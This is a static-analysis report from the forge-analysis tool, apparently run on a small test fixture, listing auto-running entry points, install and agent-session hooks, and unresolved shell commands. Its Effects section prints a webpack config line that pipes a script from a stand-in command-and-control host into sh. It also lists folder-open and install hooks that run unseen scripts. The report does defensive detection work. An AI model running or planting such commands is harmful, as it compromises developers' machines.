# Forge analysis report

- Engine: `forge-analysis 0.0.1`
- Schema: 5
- Mode: static only (no code was run)
- Scope: quick (only files that run by themselves; everything else is counted as not examined)
- Snapshot: `fc72c706ef0551e9255916d6803b48eb637da4260a8b5c0888a5504a409f42f3`
- Catalog: `661ff253d0997c290715b16d7de935041072e290e1efd30a82fa0c75eed0949b`

<a id="index"></a>

## Index

1. [Overview](#overview) — What was analysed, whether the picture is complete, and one count for everything we could not see.
2. [Entry points](#entry-points) (1) — What runs first: runtime and install entry files, and declared entries that do not match any analysed file.
3. [Execution timeline](#execution-timeline) (1) — When code runs: which functions run immediately, later, repeatedly, on events, at exit or at install, and every timer.
4. [Effects](#effects) (1) — What the code does to the outside world: files, network, processes, environment and loading of code, each with its location.
5. [Data flows](#data-flows) (0) — Data from the network or a file that can reach code execution or a command, from where it enters to where it is used.
6. [Install scripts and shell commands](#install-scripts-and-shell-commands) (10) — Every command a project file asks a tool or package manager to run (package.json scripts, editor tasks, agent hooks, git settings and more): when it runs, and the commands inside it that we could not follow.
7. [Dependencies](#dependencies) (0) — Every declared dependency with where its code comes from: registry, git, URL, local path or bundled.
8. [Unresolved](#unresolved) (9) — Places where static analysis cannot say what happens (computed code, dynamic loads, shell commands). Each one hides behaviour.
9. [Unlinked imports](#unlinked-imports) (0) — Imports we could not follow to their source: packages, missing files and names that are not exported.
10. [Not analysed](#not-analysed) (13) — Files and folders that were not read as code, by kind, and anything skipped by a limit.
11. [Function index](#function-index) (1) — Every function with its lanes, effects, callers and the facts inside it.

<a id="overview"></a>

## 1. Overview

What was analysed, whether the picture is complete, and one count for everything we could not see.

**Status: incomplete.** Some of the code could not be seen. Each line below says how much, and links to the section that lists every item.

| What we could not see | Count | Listed in |
|---|---|---|
| places where static analysis cannot say what happens | 9 | [Unresolved](#unresolved) |
| imports not followed to their source | 0 | [Unlinked imports](#unlinked-imports) |
| declared entry points that match no analysed file | 0 | [Entry points](#entry-points) |
| files or folders not read as code | 13 | [Not analysed](#not-analysed) |
| dependencies whose own code and install scripts were not analysed | 0 | [Dependencies](#dependencies) |
| calls whose target we could not see (no function followed, no fact) | 0 | [Function index](#function-index) |

- Files analysed: 1
- Files not analysed: 13
- Functions: 1
- Cross-file links made: 0
- Unresolved facts not listed as open because their call was followed to its source: 0
- Facts found: 22
- Facts by kind: 0 entry, 1 import, 1 call, 1 effect, 0 timer, 10 script, 0 dependency, 9 unresolved, 0 flow

[Back to the index](#index)

<a id="entry-points"></a>

## 2. Entry points

What runs first: runtime and install entry files, and declared entries that do not match any analysed file.

Nothing usable was declared, so every file that no other file imports is treated as an entry.

### Runtime entry files (1)

- `webpack.config.js`

### Install entry files (0)

Run when the package is installed.

None found.

### Declared entries that match no analysed file (0)

None found.

[Back to the index](#index)

<a id="execution-timeline"></a>

## 3. Execution timeline

When code runs: which functions run immediately, later, repeatedly, on events, at exit or at install, and every timer.

### Immediate (1)

Runs right away when the program starts.

- top level of `webpack.config.js`

### Timers (0)

None found.

[Back to the index](#index)

<a id="effects"></a>

## 4. Effects

What the code does to the outside world: files, network, processes, environment and loading of code, each with its location.

### Starts other programs (1)

- `webpack.config.js:1` in top level of `webpack.config.js` (runs: immediate): `curl -s https://c2.example/i.sh | sh`

[Back to the index](#index)

<a id="data-flows"></a>

## 5. Data flows

Data from the network or a file that can reach code execution or a command, from where it enters to where it is used.

None found.

[Back to the index](#index)

<a id="install-scripts-and-shell-commands"></a>

## 6. Install scripts and shell commands

Every command a project file asks a tool or package manager to run (package.json scripts, editor tasks, agent hooks, git settings and more): when it runs, and the commands inside it that we could not follow.

### Scripts (10)

- `post-install-cmd` (runs at install) at `composer.json:1`: `sh x.sh`
  - not followed: `sh x.sh`
- `SessionStart` (runs when the folder is opened or a session starts) at `.claude/settings.json:1`: `sh x.sh`
  - not followed: `sh x.sh`
- `mcp_servers.codexhelper` (runs when the folder is opened or a session starts) at `.codex/config.toml:1`: `npx -y some-server`
  - not followed: `npx -y some-server`
- `initializeCommand` (runs when the folder is opened or a session starts) at `.devcontainer/devcontainer.json:1`: `sh x.sh`
  - not followed: `sh x.sh`
- `helper` (runs when the folder is opened or a session starts) at `.mcp.json:1`: `npx -y some-server`
  - not followed: `npx -y some-server`
- `x` (runs when the folder is opened or a session starts) at `.vscode/tasks.json:5`: `sh x.sh`
  - not followed: `sh x.sh`
- `hooks.enter` (runs when the folder is opened or a session starts) at `mise.toml:2`: `sh enter.sh`
  - not followed: `sh enter.sh`
- `build.rustc-wrapper` (runs during a build or restore) at `.cargo/config.toml:2`: `x`
  - not followed: `x`
- `build-system.backend-path` (runs during a build or restore) at `pyproject.toml:4`: `tools`
- `build` (runs only when someone asks) at `.vscode/tasks.json:6`: `make`
  - not followed: `make`

[Back to the index](#index)

<a id="dependencies"></a>

## 7. Dependencies

Every declared dependency with where its code comes from: registry, git, URL, local path or bundled.

None found.

[Back to the index](#index)

<a id="unresolved"></a>

## 8. Unresolved

Places where static analysis cannot say what happens (computed code, dynamic loads, shell commands). Each one hides behaviour.

### Shell command not followed (9)

A command in a script that is not `node <file>` or `npm run <script>`, or one built at run time.

- `.cargo/config.toml:2`: `x`
- `.claude/settings.json:1`: `sh x.sh`
- `.codex/config.toml:1`: `npx -y some-server`
- `.devcontainer/devcontainer.json:1`: `sh x.sh`
- `.mcp.json:1`: `npx -y some-server`
- `.vscode/tasks.json:5`: `sh x.sh`
- `.vscode/tasks.json:6`: `make`
- `composer.json:1`: `sh x.sh`
- `mise.toml:2`: `sh enter.sh`

[Back to the index](#index)

<a id="unlinked-imports"></a>

## 9. Unlinked imports

Imports we could not follow to their source: packages, missing files and names that are not exported.

None found.

[Back to the index](#index)

<a id="not-analysed"></a>

## 10. Not analysed

Files and folders that were not read as code, by kind, and anything skipped by a limit.

### Build and tool files that run by themselves (8)

Files a tool, editor or package manager reads and acts on without being asked: build scripts, MSBuild `Directory.Build.*`, editor tasks, AI-agent hooks, git hooks, `setup.py`, `build.rs` and the like. They can run commands or change where packages come from. Not read yet, and most are harmless: this says they could act, not that they do. MSBuild also reads `Directory.Build.props` and `.targets` from parent folders, which are outside what was analysed.

- `.envrc` (11 bytes)
- `.husky/pre-commit` (18 bytes)
- `Gemfile` (30 bytes)
- `Makefile` (14 bytes)
- `build.rs` (13 bytes)
- `pom.xml` (11 bytes)
- `setup.py` (27 bytes)
- `venv/pyvenv.cfg` (19 bytes)

### Archives and packages (not opened) (2)

`.zip`, `.tgz`, `.jar`, `.whl`, `.vsix` and the like. Their contents are not opened, so anything inside them, including code that runs when they are unpacked or loaded, is unseen.

- `dist/release.tgz` (8 bytes)
- `tools/helper.jar` (8 bytes)

### Other files (2)

Not code we analyse (documents, images, data, unknown types). Listed so nothing is hidden.

- `docs/notes.md` (8 bytes)
- `tsconfig.json` (23 bytes)

### Not read: outside the quick scan (1)

Code a full run would read. A quick scan reads only the files that run by themselves, and what they load.

- `src/app.js` (20 bytes)

[Back to the index](#index)

<a id="function-index"></a>

## 11. Function index

Every function with its lanes, effects, callers and the facts inside it.

### `webpack.config.js` (1)

- top level at line 1
  - runs: immediate
  - can reach: starts other programs
  - calls to something other than a function in this file: 2 (0 followed through an import or a prop, 2 matched to a fact, 0 not traced to any code)
  - facts: `fact:668cafc63fc08e1c`, `fact:baa3b1dceff07ff8`, `fact:4bced2e6cc590d2f`

[Back to the index](#index)
